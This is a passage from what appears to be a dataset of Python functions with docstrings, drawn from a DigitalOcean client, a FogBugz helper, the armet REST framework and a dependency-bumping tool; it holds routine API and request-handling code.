            "def list(self, url_components=()):\n        \"\"\"\n        Send list request for all members of a collection\n        \"\"\"\n        resp = self.get(url_components)\n        return resp.get(self.result_key, [])"
        ],
        [
            "def get(self, id, **kwargs):\n        \"\"\"\n        Get single unit of collection\n        \"\"\"\n        return (super(MutableCollection, self).get((id,), **kwargs)\n                .get(self.singular, None))"
        ],
        [
            "def transfer(self, region):\n        \"\"\"\n        Transfer this image to given region\n\n        Parameters\n        ----------\n        region: str\n            region slug to transfer to (e.g., sfo1, nyc1)\n        \"\"\"\n        action = self.post(type='transfer', region=region)['action']\n        return self.parent.get(action['resource_id'])"
        ],
        [
            "def get(self, id):\n        \"\"\"id or slug\"\"\"\n        info = super(Images, self).get(id)\n        return ImageActions(self.api, parent=self, **info)"
        ],
        [
            "def update(self, id, name):\n        \"\"\"id or fingerprint\"\"\"\n        return super(Keys, self).update(id, name=name)"
        ],
        [
            "def create(self, name, ip_address):\n        \"\"\"\n        Creates a new domain\n\n        Parameters\n        ----------\n        name: str\n            new domain name\n        ip_address: str\n            IP address for the new domain\n        \"\"\"\n        return (self.post(name=name, ip_address=ip_address)\n                .get(self.singular, None))"
        ],
        [
            "def records(self, name):\n        \"\"\"\n        Get a list of all domain records for the given domain name\n\n        Parameters\n        ----------\n        name: str\n            domain name\n        \"\"\"\n        if self.get(name):\n            return DomainRecords(self.api, name)"
        ],
        [
            "def rename(self, id, name):\n        \"\"\"\n        Change the name of this domain record\n\n        Parameters\n        ----------\n        id: int\n            domain record id\n        name: str\n            new name of record\n        \"\"\"\n        return super(DomainRecords, self).update(id, name=name)[self.singular]"
        ],
        [
            "def get(self, id, **kwargs):\n        \"\"\"\n        Retrieve a single domain record given the id\n        \"\"\"\n        return super(DomainRecords, self).get(id, **kwargs)"
        ],
        [
            "def logon(self, username, password):\n        \"\"\"\n        Logs the user on to FogBugz.\n\n        Returns None for a successful login.\n        \"\"\"\n        if self._token:\n            self.logoff()\n        try:\n            response = self.__makerequest(\n                'logon', email=username, password=password)\n        except FogBugzAPIError:\n            e = sys.exc_info()[1]\n            raise FogBugzLogonError(e)\n\n        self._token = response.token.string\n        if type(self._token) == CData:\n                self._token = self._token.encode('utf-8')"
        ],
        [
            "def chop(list_, n):\n    \"Chop list_ into n chunks. Returns a list.\"\n    # could look into itertools also, might be implemented there\n    size = len(list_)\n    each = size // n\n    if each == 0:\n        return [list_]\n    chopped = []\n    for i in range(n):\n        start = i * each\n        end = (i+1) * each\n        if i == (n - 1):\n        # make sure we get all items, let last worker do a litte more\n            end = size\n        chopped.append(list_[start:end])\n    return chopped"
        ],
        [
            "def get_first():\n    \"\"\"\n    return first droplet\n    \"\"\"\n    client = po.connect() # this depends on the DIGITALOCEAN_API_KEY envvar\n    all_droplets = client.droplets.list()\n    id = all_droplets[0]['id'] # I'm cheating because I only have one droplet\n    return client.droplets.get(id)"
        ],
        [
            "def take_snapshot(droplet, name):\n    \"\"\"\n    Take a snapshot of a droplet\n\n    Parameters\n    ----------\n    name: str\n        name for snapshot\n    \"\"\"\n    print \"powering off\"\n    droplet.power_off()\n    droplet.wait() # wait for pending actions to complete\n    print \"taking snapshot\"\n    droplet.take_snapshot(name)\n    droplet.wait()\n    snapshots = droplet.snapshots()\n    print \"Current snapshots\"\n    print snapshots"
        ],
        [
            "def allowed_operations(self):\n        \"\"\"Retrieves the allowed operations for this request.\"\"\"\n        if self.slug is not None:\n            return self.meta.detail_allowed_operations\n\n        return self.meta.list_allowed_operations"
        ],
        [
            "def assert_operations(self, *args):\n        \"\"\"Assets if the requested operations are allowed in this context.\"\"\"\n        if not set(args).issubset(self.allowed_operations):\n            raise http.exceptions.Forbidden()"
        ],
        [
            "def make_response(self, data=None):\n        \"\"\"Fills the response object from the passed data.\"\"\"\n        if data is not None:\n            # Prepare the data for transmission.\n            data = self.prepare(data)\n\n            # Encode the data using a desired encoder.\n            self.response.write(data, serialize=True)"
        ],
        [
            "def get(self, request, response):\n        \"\"\"Processes a `GET` request.\"\"\"\n        # Ensure we're allowed to read the resource.\n        self.assert_operations('read')\n\n        # Delegate to `read` to retrieve the items.\n        items = self.read()\n\n        # if self.slug is not None and not items:\n        #     # Requested a specific resource but nothing is returned.\n\n        #     # Attempt to resolve by changing what we understand as\n        #     # a slug to a path.\n        #     self.path = self.path + self.slug if self.path else self.slug\n        #     self.slug = None\n\n        #     # Attempt to retreive the resource again.\n        #     items = self.read()\n\n        # Ensure that if we have a slug and still no items that a 404\n        # is rasied appropriately.\n        if not items:\n            raise http.exceptions.NotFound()\n\n        if (isinstance(items, Iterable)\n                and not isinstance(items, six.string_types)) and items:\n            # Paginate over the collection.\n            items = pagination.paginate(self.request, self.response, items)\n\n        # Build the response object.\n        self.make_response(items)"
        ],
        [
            "def post(self, request, response):\n        \"\"\"Processes a `POST` request.\"\"\"\n        if self.slug is not None:\n            # Don't know what to do an item access.\n            raise http.exceptions.NotImplemented()\n\n        # Ensure we're allowed to create a resource.\n        self.assert_operations('create')\n\n        # Deserialize and clean the incoming object.\n        data = self._clean(None, self.request.read(deserialize=True))\n\n        # Delegate to `create` to create the item.\n        item = self.create(data)\n\n        # Build the response object.\n        self.response.status = http.client.CREATED\n        self.make_response(item)"
        ],
        [
            "def put(self, request, response):\n        \"\"\"Processes a `PUT` request.\"\"\"\n        if self.slug is None:\n            # Mass-PUT is not implemented.\n            raise http.exceptions.NotImplemented()\n\n        # Check if the resource exists.\n        target = self.read()\n\n        # Deserialize and clean the incoming object.\n        data = self._clean(target, self.request.read(deserialize=True))\n\n        if target is not None:\n            # Ensure we're allowed to update the resource.\n            self.assert_operations('update')\n\n            try:\n                # Delegate to `update` to create the item.\n                self.update(target, data)\n\n            except AttributeError:\n                # No read method defined.\n                raise http.exceptions.NotImplemented()\n\n            # Build the response object.\n            self.make_response(target)\n\n        else:\n            # Ensure we're allowed to create the resource.\n            self.assert_operations('create')\n\n            # Delegate to `create` to create the item.\n            target = self.create(data)\n\n            # Build the response object.\n            self.response.status = http.client.CREATED\n            self.make_response(target)"
        ],
        [
            "def delete(self, request, response):\n        \"\"\"Processes a `DELETE` request.\"\"\"\n        if self.slug is None:\n            # Mass-DELETE is not implemented.\n            raise http.exceptions.NotImplemented()\n\n        # Ensure we're allowed to destroy a resource.\n        self.assert_operations('destroy')\n\n        # Delegate to `destroy` to destroy the item.\n        self.destroy()\n\n        # Build the response object.\n        self.response.status = http.client.NO_CONTENT\n        self.make_response()"
        ],
        [
            "def link(self, request, response):\n        \"\"\"Processes a `LINK` request.\n\n        A `LINK` request is asking to create a relation from the currently\n        represented URI to all of the `Link` request headers.\n        \"\"\"\n        from armet.resources.managed.request import read\n\n        if self.slug is None:\n            # Mass-LINK is not implemented.\n            raise http.exceptions.NotImplemented()\n\n        # Get the current target.\n        target = self.read()\n\n        # Collect all the passed link headers.\n        links = self._parse_link_headers(request['Link'])\n\n        # Pull targets for each represented link.\n        for link in links:\n            # Delegate to a connector.\n            self.relate(target, read(self, link['uri']))\n\n        # Build the response object.\n        self.response.status = http.client.NO_CONTENT\n        self.make_response()"
        ],
        [
            "def create_project(self):\n        '''\n        Creates a base Django project\n        '''\n        if os.path.exists(self._py):\n            prj_dir = os.path.join(self._app_dir, self._project_name)\n            if os.path.exists(prj_dir):\n                if self._force:\n                    logging.warn('Removing existing project')\n                    shutil.rmtree(prj_dir)\n                else:\n                    logging.warn('Found existing project; not creating (use --force to overwrite)')\n                    return\n            logging.info('Creating project')\n            p = subprocess.Popen('cd {0} ; {1} startproject {2} > /dev/null'.format(self._app_dir, self._ve_dir + os.sep + self._project_name + \\\n            os.sep + 'bin' + os.sep + 'django-admin.py', self._project_name), \\\n            shell=True)\n            os.waitpid(p.pid, 0)\n        else:\n            logging.error('Unable to find Python interpreter in virtualenv')\n            return"
        ],
        [
            "def ilike_helper(default):\n    \"\"\"Helper function that performs an `ilike` query if a string value\n    is passed, otherwise the normal default operation.\"\"\"\n    @functools.wraps(default)\n    def wrapped(x, y):\n        # String values should use ILIKE queries.\n        if isinstance(y, six.string_types) and not isinstance(x.type, sa.Enum):\n            return x.ilike(\"%\" + y + \"%\")\n        else:\n            return default(x, y)\n    return wrapped"
        ],
        [
            "def parse(text, encoding='utf8'):\n    \"\"\"Parse the querystring into a normalized form.\"\"\"\n\n    # Decode the text if we got bytes.\n    if isinstance(text, six.binary_type):\n        text = text.decode(encoding)\n\n    return Query(text, split_segments(text))"
        ],
        [
            "def split_segments(text, closing_paren=False):\n    \"\"\"Return objects representing segments.\"\"\"\n    buf = StringIO()\n\n    # The segments we're building, and the combinators used to combine them.\n    # Note that after this is complete, this should be true:\n    # len(segments) == len(combinators) + 1\n    # Thus we can understand the relationship between segments and combinators\n    # like so:\n    #  s1 (c1) s2 (c2) s3 (c3) where sN are segments and cN are combination\n    # functions.\n    # TODO: Figure out exactly where the querystring died and post cool\n    # error messages about it.\n    segments = []\n    combinators = []\n\n    # A flag dictating if the last character we processed was a group.\n    # This is used to determine if the next character (being a combinator)\n    # is allowed to\n    last_group = False\n\n    # The recursive nature of this function relies on keeping track of the\n    # state of iteration.  This iterator will be passed down to recursed calls.\n    iterator = iter(text)\n\n    # Detection for exclamation points.  only matters for this situation:\n    # foo=bar&!(bar=baz)\n    last_negation = False\n\n    for character in iterator:\n        if character in COMBINATORS:\n\n            if last_negation:\n                buf.write(constants.OPERATOR_NEGATION)\n\n            # The string representation of our segment.\n            val = buf.getvalue()\n            reset_stringio(buf)\n\n            if not last_group and not len(val):\n                raise ValueError('Unexpected %s.' % character)\n\n            # When a group happens, the previous value is empty.\n            if len(val):\n                segments.append(parse_segment(val))\n\n            combinators.append(COMBINATORS[character])\n\n        elif character == constants.GROUP_BEGIN:\n            # Recursively go into the next group.\n\n            if buf.tell():\n                raise ValueError('Unexpected %s' % character)\n\n            seg = split_segments(iterator, True)\n\n            if last_negation:\n                seg = UnarySegmentCombinator(seg)\n\n            segments.append(seg)\n\n            # Flag that the last entry was a grouping, so that we don't panic\n            # when the next character is a logical combinator\n            last_group = True\n            continue\n\n        elif character == constants.GROUP_END:\n            # Build the segment for anything remaining, and then combine\n            # all the segments.\n            val = buf.getvalue()\n\n            # Check for unbalanced parens or an empty thing: foo=bar&();bar=baz\n            if not buf.tell() or not closing_paren:\n                raise ValueError('Unexpected %s' % character)\n\n            segments.append(parse_segment(val))\n            return combine(segments, combinators)\n\n        elif character == constants.OPERATOR_NEGATION and not buf.tell():\n            last_negation = True\n            continue\n\n        else:\n            if last_negation:\n                buf.write(constants.OPERATOR_NEGATION)\n            if last_group:\n                raise ValueError('Unexpected %s' % character)\n            buf.write(character)\n\n        last_negation = False\n        last_group = False\n    else:\n        # Check and see if the iterator exited early (unbalanced parens)\n        if closing_paren:\n            raise ValueError('Expected %s.' % constants.GROUP_END)\n\n        if not last_group:\n            # Add the final segment.\n            segments.append(parse_segment(buf.getvalue()))\n\n    # Everything completed normally, combine all the segments into one\n    # and return them.\n    return combine(segments, combinators)"
        ],
        [
            "def parse_segment(text):\n    \"we expect foo=bar\"\n\n    if not len(text):\n        return NoopQuerySegment()\n\n    q = QuerySegment()\n\n    # First we need to split the segment into key/value pairs.  This is done\n    # by attempting to split the sequence for each equality comparison.  Then\n    # discard any that did not split properly.  Then chose the smallest key\n    # (greedily chose the first comparator we encounter in the string)\n    # followed by the smallest value (greedily chose the largest comparator\n    # possible.)\n\n    # translate into [('=', 'foo=bar')]\n    equalities = zip(constants.OPERATOR_EQUALITIES, itertools.repeat(text))\n    # Translate into [('=', ['foo', 'bar'])]\n    equalities = map(lambda x: (x[0], x[1].split(x[0], 1)), equalities)\n    # Remove unsplit entries and translate into [('=': ['foo', 'bar'])]\n    # Note that the result from this stage is iterated over twice.\n    equalities = list(filter(lambda x: len(x[1]) > 1, equalities))\n    # Get the smallest key and use the length of that to remove other items\n    key_len = len(min((x[1][0] for x in equalities), key=len))\n    equalities = filter(lambda x: len(x[1][0]) == key_len, equalities)\n\n    # Get the smallest value length. thus we have the earliest key and the\n    # smallest value.\n    op, (key, value) = min(equalities, key=lambda x: len(x[1][1]))\n\n    key, directive = parse_directive(key)\n    if directive:\n        op = constants.OPERATOR_EQUALITY_FALLBACK\n        q.directive = directive\n\n    # Process negation.  This comes in both foo.not= and foo!= forms.\n    path = key.split(constants.SEP_PATH)\n    last = path[-1]\n\n    # Check for !=\n    if last.endswith(constants.OPERATOR_NEGATION):\n        last = last[:-1]\n        q.negated = not q.negated\n\n    # Check for foo.not=\n    if last == constants.PATH_NEGATION:\n        path.pop(-1)\n        q.negated = not q.negated\n\n    q.values = value.split(constants.SEP_VALUE)\n\n    # Check for suffixed operators (foo.gte=bar).  Prioritize suffixed\n    # entries over actual equality checks.\n    if path[-1] in constants.OPERATOR_SUFFIXES:\n\n        # The case where foo.gte<=bar, which obviously makes no sense.\n        if op not in constants.OPERATOR_FALLBACK:\n            raise ValueError(\n                'Both path-style operator and equality style operator '\n                'provided.  Please provide only a single style operator.')\n\n        q.operator = constants.OPERATOR_SUFFIX_MAP[path[-1]]\n        path.pop(-1)\n    else:\n        q.operator = constants.OPERATOR_EQUALITY_MAP[op]\n\n    if not len(path):\n        raise ValueError('No attribute navigation path provided.')\n\n    q.path = path\n\n    return q"
        ],
        [
            "def set(self, target, value):\n        \"\"\"Set the value of this attribute for the passed object.\n        \"\"\"\n\n        if not self._set:\n            return\n\n        if self.path is None:\n            # There is no path defined on this resource.\n            # We can do no magic to set the value.\n            self.set = lambda *a: None\n            return None\n\n        if self._segments[target.__class__]:\n            # Attempt to resolve access to this attribute.\n            self.get(target)\n\n        if self._segments[target.__class__]:\n            # Attribute is not fully resolved; an interim segment is null.\n            return\n\n        # Resolve access to the parent object.\n        # For a single-segment path this will effectively be a no-op.\n        parent_getter = compose(*self._getters[target.__class__][:-1])\n        target = parent_getter(target)\n\n        # Make the setter.\n        func = self._make_setter(self.path.split('.')[-1], target.__class__)\n\n        # Apply the setter now.\n        func(target, value)\n\n        # Replace this function with the constructed setter.\n        def setter(target, value):\n            func(parent_getter(target), value)\n\n        self.set = setter"
        ],
        [
            "def parse(specifiers):\n    \"\"\"\n    Consumes set specifiers as text and forms a generator to retrieve\n    the requested ranges.\n\n    @param[in] specifiers\n        Expected syntax is from the byte-range-specifier ABNF found in the\n        [RFC 2616]; eg. 15-17,151,-16,26-278,15\n\n    @returns\n        Consecutive tuples that describe the requested range; eg. (1, 72) or\n        (1, 1) [read as 1 to 72 or 1 to 1].\n    \"\"\"\n    specifiers = \"\".join(specifiers.split())\n    for specifier in specifiers.split(','):\n        if len(specifier) == 0:\n            raise ValueError(\"Range: Invalid syntax; missing specifier.\")\n\n        count = specifier.count('-')\n        if (count and specifier[0] == '-') or not count:\n            # Single specifier; return as a tuple to itself.\n            yield int(specifier), int(specifier)\n            continue\n\n        specifier = list(map(int, specifier.split('-')))\n        if len(specifier) == 2:\n            # Range specifier; return as a tuple.\n            if specifier[0] < 0 or specifier[1] < 0:\n                # Negative indexing is not supported in range specifiers\n                # as stated in the HTTP/1.1 Range header specification.\n                raise ValueError(\n                    \"Range: Invalid syntax; negative indexing \"\n                    \"not supported in a range specifier.\")\n\n            if specifier[1] < specifier[0]:\n                # Range must be for at least one item.\n                raise ValueError(\n                    \"Range: Invalid syntax; stop is less than start.\")\n\n            # Return them as a immutable tuple.\n            yield tuple(specifier)\n            continue\n\n        # Something weird happened.\n        raise ValueError(\"Range: Invalid syntax.\")"
        ],
        [
            "def paginate(request, response, items):\n    \"\"\"Paginate an iterable during a request.\n\n    Magically splicling an iterable in our supported ORMs allows LIMIT and\n    OFFSET queries. We should probably delegate this to the ORM or something\n    in the future.\n    \"\"\"\n    # TODO: support dynamic rangewords and page lengths\n    # TODO: support multi-part range requests\n\n    # Get the header\n    header = request.headers.get('Range')\n    if not header:\n        # No range header; move along.\n        return items\n\n    # do some validation\n    prefix = RANGE_SPECIFIER + '='\n    if not header.find(prefix) == 0:\n        # This is not using a range specifier that we understand\n        raise exceptions.RequestedRangeNotSatisfiable()\n    else:\n        # Chop the prefix off the header and parse it\n        ranges = parse(header[len(prefix):])\n\n    ranges = list(ranges)\n    if len(ranges) > 1:\n        raise exceptions.RequestedRangeNotSatisfiable(\n            'Multiple ranges in a single request is not yet supported.')\n    start, end = ranges[0]\n\n    # Make sure the length is not higher than the total number allowed.\n    max_length = request.resource.count(items)\n    end = min(end, max_length)\n\n    response.status = client.PARTIAL_CONTENT\n    response.headers['Content-Range'] = '%d-%d/%d' % (start, end, max_length)\n    response.headers['Accept-Ranges'] = RANGE_SPECIFIER\n\n    # Splice and return the items.\n    items = items[start:end + 1]\n    return items"
        ],
        [
            "def indexesOptional(f):\n    \"\"\"Decorate test methods with this if you don't require strict index checking\"\"\"\n    stack = inspect.stack()\n    _NO_INDEX_CHECK_NEEDED.add('%s.%s.%s' % (f.__module__, stack[1][3], f.__name__))\n    del stack\n    return f"
        ],
        [
            "def read(self, deserialize=False, format=None):\n        \"\"\"Read and return the request data.\n\n        @param[in] deserialize\n            True to deserialize the resultant text using a determiend format\n            or the passed format.\n\n        @param[in] format\n            A specific format to deserialize in; if provided, no detection is\n            done. If not provided, the content-type header is looked at to\n            determine an appropriate deserializer.\n        \"\"\"\n\n        if deserialize:\n            data, _ = self.deserialize(format=format)\n            return data\n\n        content = self._read()\n\n        if not content:\n            return ''\n\n        if type(content) is six.binary_type:\n            content = content.decode(self.encoding)\n\n        return content"
        ],
        [
            "def use(**kwargs):\n    \"\"\"\n    Updates the active resource configuration to the passed\n    keyword arguments.\n\n    Invoking this method without passing arguments will just return the\n    active resource configuration.\n\n    @returns\n        The previous configuration.\n    \"\"\"\n    config = dict(use.config)\n    use.config.update(kwargs)\n    return config"
        ],
        [
            "def try_delegation(method):\n    '''This decorator wraps descriptor methods with a new method that tries\n    to delegate to a function of the same name defined on the owner instance\n    for convenience for dispatcher clients.\n    '''\n    @functools.wraps(method)\n    def delegator(self, *args, **kwargs):\n        if self.try_delegation:\n            # Try to dispatch to the instance's implementation.\n            inst = getattr(self, 'inst', None)\n            if inst is not None:\n                method_name = (self.delegator_prefix or '') + method.__name__\n                func = getattr(inst, method_name, None)\n                if func is not None:\n                    return func(*args, **kwargs)\n\n        # Otherwise run the decorated func.\n        return method(self, *args, **kwargs)\n\n    return delegator"
        ],
        [
            "def register(self, method, args, kwargs):\n        '''Given a single decorated handler function,\n        prepare, append desired data to self.registry.\n        '''\n        invoc = self.dump_invoc(*args, **kwargs)\n        self.registry.append((invoc, method.__name__))"
        ],
        [
            "def get_method(self, *args, **kwargs):\n        '''Find the first method this input dispatches to.\n        '''\n        for method in self.gen_methods(*args, **kwargs):\n            return method\n        msg = 'No method was found for %r on %r.'\n        raise self.DispatchError(msg % ((args, kwargs), self.inst))"
        ],
        [
            "def gen_method_keys(self, *args, **kwargs):\n        '''Given a node, return the string to use in computing the\n        matching visitor methodname. Can also be a generator of strings.\n        '''\n        token = args[0]\n        for mro_type in type(token).__mro__[:-1]:\n            name = mro_type.__name__\n            yield name"
        ],
        [
            "def gen_methods(self, *args, **kwargs):\n        '''Find all method names this input dispatches to.\n        '''\n        token = args[0]\n        inst = self.inst\n        prefix = self._method_prefix\n        for method_key in self.gen_method_keys(*args, **kwargs):\n            method = getattr(inst, prefix + method_key, None)\n            if method is not None:\n                yield method\n\n        # Fall back to built-in types, then types, then collections.\n        typename = type(token).__name__\n        yield from self.check_basetype(\n            token, typename, self.builtins.get(typename))\n\n        for basetype_name in self.interp_types:\n            yield from self.check_basetype(\n                token, basetype_name, getattr(self.types, basetype_name, None))\n\n        for basetype_name in self.abc_types:\n            yield from self.check_basetype(\n                token, basetype_name, getattr(self.collections, basetype_name, None))\n\n        # Try the generic handler.\n        yield from self.gen_generic()"
        ],
        [
            "def parse(cls, s, required=False):\n        \"\"\"\n          Parse string to create an instance\n\n          :param str s: String with requirement to parse\n          :param bool required: Is this requirement required to be fulfilled? If not, then it is a filter.\n        \"\"\"\n        req = pkg_resources.Requirement.parse(s)\n        return cls(req, required=required)"
        ],
        [
            "def add(self, requirements, required=None):\n        \"\"\"\n        Add requirements to be managed\n\n        :param list/Requirement requirements: List of :class:`BumpRequirement` or :class:`pkg_resources.Requirement`\n        :param bool required: Set required flag for each requirement if provided.\n        \"\"\"\n        if isinstance(requirements, RequirementsManager):\n            requirements = list(requirements)\n        elif not isinstance(requirements, list):\n            requirements = [requirements]\n\n        for req in requirements:\n            name = req.project_name\n\n            if not isinstance(req, BumpRequirement):\n                req = BumpRequirement(req, required=required)\n            elif required is not None:\n                req.required = required\n\n            add = True\n\n            if name in self.requirements:\n                for existing_req in self.requirements[name]:\n                    if req == existing_req:\n                        add = False\n                        break\n\n                    # Need to replace existing as the new req will be used to bump next, and req.required could be\n                    # updated.\n                    replace = False\n\n                    # Two pins: Use highest pinned version\n                    if (req.specs and req.specs[0][0] == '==' and existing_req.specs and\n                            existing_req.specs[0][0] == '=='):\n                        if pkg_resources.parse_version(req.specs[0][1]) < pkg_resources.parse_version(\n                                existing_req.specs[0][1]):\n                            req.requirement = existing_req.requirement\n                        replace = True\n\n                    # Replace Any\n                    if not (req.specs and existing_req.specs):\n                        if existing_req.specs:\n                            req.requirement = existing_req.requirement\n                        replace = True\n\n                    if replace:\n                        req.required |= existing_req.required\n                        if existing_req.required_by and not req.required_by:\n                            req.required_by = existing_req.required_by\n                        self.requirements[name].remove(existing_req)\n                        break\n\n            if add:\n                self.requirements[name].append(req)"
        ],
        [
            "def satisfied_by_checked(self, req):\n        \"\"\"\n        Check if requirement is already satisfied by what was previously checked\n\n        :param Requirement req: Requirement to check\n        \"\"\"\n        req_man = RequirementsManager([req])\n\n        return any(req_man.check(*checked) for checked in self.checked)"
        ],
        [
            "def require(self, req):\n        \"\"\" Add new requirements that must be fulfilled for this bump to occur \"\"\"\n        reqs = req if isinstance(req, list) else [req]\n\n        for req in reqs:\n            if not isinstance(req, BumpRequirement):\n                req = BumpRequirement(req)\n            req.required = True\n            req.required_by = self\n            self.requirements.append(req)"
        ],
        [
            "def requirements_for_changes(self, changes):\n        \"\"\"\n        Parse changes for requirements\n\n        :param list changes:\n        \"\"\"\n        requirements = []\n        reqs_set = set()\n\n        if isinstance(changes, str):\n            changes = changes.split('\\n')\n\n        if not changes or changes[0].startswith('-'):\n            return requirements\n\n        for line in changes:\n            line = line.strip(' -+*')\n\n            if not line:\n                continue\n\n            match = IS_REQUIREMENTS_RE2.search(line)  # or  IS_REQUIREMENTS_RE.match(line)\n            if match:\n                for match in REQUIREMENTS_RE.findall(match.group(1)):\n                    if match[1]:\n                        version = '==' + match[2] if match[1].startswith(' to ') else match[1]\n                        req_str = match[0] + version\n                    else:\n                        req_str = match[0]\n\n                    if req_str not in reqs_set:\n                        reqs_set.add(req_str)\n                        try:\n                            requirements.append(pkg_resources.Requirement.parse(req_str))\n                        except Exception as e:\n                            log.warn('Could not parse requirement \"%s\" from changes: %s', req_str, e)\n\n        return requirements"
        ],
        [
            "def bump(self, bump_reqs=None, **kwargs):\n        \"\"\"\n          Bump dependencies using given requirements.\n\n          :param RequirementsManager bump_reqs: Bump requirements manager\n          :param dict kwargs: Additional args from argparse. Some bumpers accept user options, and some not.\n          :return: List of :class:`Bump` changes made.\n        \"\"\"\n\n        bumps = {}\n\n        for existing_req in sorted(self.requirements(), key=lambda r: r.project_name):\n            if bump_reqs and existing_req.project_name not in bump_reqs:\n                continue\n\n            bump_reqs.check(existing_req)\n\n            try:\n                bump = self._bump(existing_req, bump_reqs.get(existing_req.project_name))\n\n                if bump:\n                    bumps[bump.name] = bump\n                    bump_reqs.check(bump)\n\n            except Exception as e:\n                if bump_reqs and bump_reqs.get(existing_req.project_name) and all(\n                        r.required_by is None for r in bump_reqs.get(existing_req.project_name)):\n                    raise\n                else:\n                    log.warn(e)\n\n        for reqs in bump_reqs.required_requirements().values():\n            name = reqs[0].project_name\n            if name not in bumps and self.should_add(name):\n                try:\n                    bump = self._bump(None, reqs)\n\n                    if bump:\n                        bumps[bump.name] = bump\n                        bump_reqs.check(bump)\n\n                except Exception as e:\n                    if all(r.required_by is None for r in reqs):\n                        raise\n                    else:\n                        log.warn(e)\n\n        self.bumps.update(bumps.values())\n\n        return bumps.values()"
        ],
        [
            "def reverse(self):\n        \"\"\" Restore content in target file to be before any changes \"\"\"\n        if self._original_target_content:\n            with open(self.target, 'w') as fp:\n                fp.write(self._original_target_content)"
        ],
        [
            "def serialize(self, data=None):\n        \"\"\"\n        Transforms the object into an acceptable format for transmission.\n\n        @throws ValueError\n            To indicate this serializer does not support the encoding of the\n            specified object.\n        \"\"\"\n        if data is not None and self.response is not None:\n            # Set the content type.\n            self.response['Content-Type'] = self.media_types[0]\n\n            # Write the encoded and prepared data to the response.\n            self.response.write(data)\n\n        # Return the serialized data.\n        # This has normally been transformed by a base class.\n        return data"
        ],
        [
            "def cons(collection, value):\n    \"\"\"Extends a collection with a value.\"\"\"\n    if isinstance(value, collections.Mapping):\n        if collection is None:\n            collection = {}\n        collection.update(**value)\n\n    elif isinstance(value, six.string_types):\n        if collection is None:\n            collection = []\n        collection.append(value)\n\n    elif isinstance(value, collections.Iterable):\n        if collection is None:\n            collection = []\n        collection.extend(value)\n\n    else:\n        if collection is None:\n            collection = []\n        collection.append(value)\n\n    return collection"
        ],
        [
            "def _merge(options, name, bases, default=None):\n    \"\"\"Merges a named option collection.\"\"\"\n    result = None\n    for base in bases:\n        if base is None:\n            continue\n\n        value = getattr(base, name, None)\n        if value is None:\n            continue\n\n        result = utils.cons(result, value)\n\n    value = options.get(name)\n    if value is not None:\n        result = utils.cons(result, value)\n\n    return result or default"
        ],
        [
            "def package_info(cls, package):\n        \"\"\" All package info for given package \"\"\"\n\n        if package not in cls.package_info_cache:\n            package_json_url = 'https://pypi.python.org/pypi/%s/json' % package\n\n            try:\n                logging.getLogger('requests').setLevel(logging.WARN)\n                response = requests.get(package_json_url)\n                response.raise_for_status()\n\n                cls.package_info_cache[package] = simplejson.loads(response.text)\n\n            except Exception as e:\n                log.debug('Could not get package info from %s: %s', package_json_url, e)\n                cls.package_info_cache[package] = None\n\n        return cls.package_info_cache[package]"
        ],
        [
            "def all_package_versions(package):\n        \"\"\" All versions for package \"\"\"\n        info = PyPI.package_info(package)\n        return info and sorted(info['releases'].keys(), key=lambda x: x.split(), reverse=True) or []"
        ],
        [
            "def close(self):\n        \"\"\"Flush and close the stream.\n\n        This is called automatically by the base resource on resources\n        unless the resource is operating asynchronously; in that case,\n        this method MUST be called in order to signal the end of the request.\n        If not the request will simply hang as it is waiting for some\n        thread to tell it to return to the client.\n        \"\"\"\n\n        # Ensure we're not closed.\n        self.require_not_closed()\n\n        if not self.streaming or self.asynchronous:\n            # We're not streaming, auto-write content-length if not\n            # already set.\n            if 'Content-Length' not in self.headers:\n                self.headers['Content-Length'] = self.tell()\n\n        # Flush out the current buffer.\n        self.flush()\n\n        # We're done with the response; inform the HTTP connector\n        # to close the response stream.\n        self._closed = True"
        ],
        [
            "def write(self, chunk, serialize=False, format=None):\n        \"\"\"Writes the given chunk to the output buffer.\n\n        @param[in] chunk\n            Either a byte array, a unicode string, or a generator. If `chunk`\n            is a generator then calling `self.write(<generator>)` is\n            equivalent to:\n\n            @code\n                for x in <generator>:\n                    self.write(x)\n                    self.flush()\n            @endcode\n\n        @param[in] serialize\n            True to serialize the lines in a determined serializer.\n\n        @param[in] format\n            A specific format to serialize in; if provided, no detection is\n            done. If not provided, the accept header (as well as the URL\n            extension) is looked at to determine an appropriate serializer.\n        \"\"\"\n\n        # Ensure we're not closed.\n        self.require_not_closed()\n\n        if chunk is None:\n            # There is nothing here.\n            return\n\n        if serialize or format is not None:\n            # Forward to the serializer to serialize the chunk\n            # before it gets written to the response.\n            self.serialize(chunk, format=format)\n            return  # `serialize` invokes write(...)\n\n        if type(chunk) is six.binary_type:\n            # Update the stream length.\n            self._length += len(chunk)\n\n            # If passed a byte string, we hope the user encoded it properly.\n            self._stream.write(chunk)\n\n        elif isinstance(chunk, six.string_types):\n            encoding = self.encoding\n            if encoding is not None:\n                # If passed a string, we can encode it for the user.\n                chunk = chunk.encode(encoding)\n\n            else:\n                # Bail; we don't have an encoding.\n                raise exceptions.InvalidOperation(\n                    'Attempting to write textual data without an encoding.')\n\n            # Update the stream length.\n            self._length += len(chunk)\n\n            # Write the encoded data into the byte stream.\n            self._stream.write(chunk)\n\n        elif isinstance(chunk, collections.Iterable):\n            # If passed some kind of iterator, attempt to recurse into\n            # oblivion.\n            for section in chunk:\n                self.write(section)\n\n        else:\n            # Bail; we have no idea what to do with this.\n            raise exceptions.InvalidOperation(\n                'Attempting to write something not recognized.')"
        ],
        [
            "def serialize(self, data, format=None):\n        \"\"\"Serializes the data into this response using a serializer.\n\n        @param[in] data\n            The data to be serialized.\n\n        @param[in] format\n            A specific format to serialize in; if provided, no detection is\n            done. If not provided, the accept header (as well as the URL\n            extension) is looked at to determine an appropriate serializer.\n\n        @returns\n            A tuple of the serialized text and an instance of the\n            serializer used.\n        \"\"\"\n        return self._resource.serialize(data, response=self, format=format)"
        ],
        [
            "def flush(self):\n        \"\"\"Flush the write buffers of the stream.\n\n        This results in writing the current contents of the write buffer to\n        the transport layer, initiating the HTTP/1.1 response. This initiates\n        a streaming response. If the `Content-Length` header is not given\n        then the chunked `Transfer-Encoding` is applied.\n        \"\"\"\n\n        # Ensure we're not closed.\n        self.require_not_closed()\n\n        # Pull out the accumulated chunk.\n        chunk = self._stream.getvalue()\n        self._stream.truncate(0)\n        self._stream.seek(0)\n\n        # Append the chunk to the body.\n        self.body = chunk if (self._body is None) else (self._body + chunk)\n\n        if self.asynchronous:\n            # We are now streaming because we're asynchronous.\n            self.streaming = True"
        ],
        [
